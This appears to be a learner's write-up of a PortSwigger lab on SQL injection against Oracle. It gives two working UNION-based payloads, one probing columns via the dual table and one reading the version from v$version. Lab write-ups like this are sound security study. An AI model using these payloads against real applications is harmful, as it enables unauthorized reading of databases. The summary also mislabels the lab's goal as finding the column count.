# SQL Injection - Quering the database type and version on Oracle

## 📌 Lab Details
- **Title**: SQL Injection - Quering Database
- **Difficulty**: Medium
- **Category**: SQL Injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/974bd9df06352f8b59c679f854a5bc7e3db6c7fb83f72db653509252a6d47e28?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-querying-database-version-oracle

## 🔍 Summary
This lab demonstrated how an Sql Injecection attack can be used to retrieve the number of columns in a database.

## 🛠 Steps to Solve
1. Use Burp Suite to intercept and modify the request.
2. Injected '+UNION+SELECT+'abc','def'+FROM+dual-- into the search field
3. Following payload '+UNION+SELECT+BANNER,+NULL+FROM+v$version-- for the database version

## 📖 Key Takeaways
- Understanding how a built in table like 'dual' can allow for an SQL Injection attack.
- Retrieving the number of columns of the database can allow for a UNION or an ORDER BY attack.


